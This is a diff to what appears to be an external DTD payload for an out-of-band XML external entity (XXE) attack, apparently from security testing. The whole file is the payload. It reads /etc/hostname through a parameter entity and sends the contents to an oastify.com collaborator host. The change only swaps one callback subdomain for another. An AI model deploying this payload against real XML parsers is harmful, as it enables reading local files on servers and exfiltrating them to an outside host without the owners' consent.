@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://c1e48dcb13g45pktma16djo5iwonce42t.oastify.com/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://m4rebnfl4dje8zn3pk4ggtrfl6rxfo8cx.oastify.com/?x=%file;'>">
 %eval;
 %exfil;
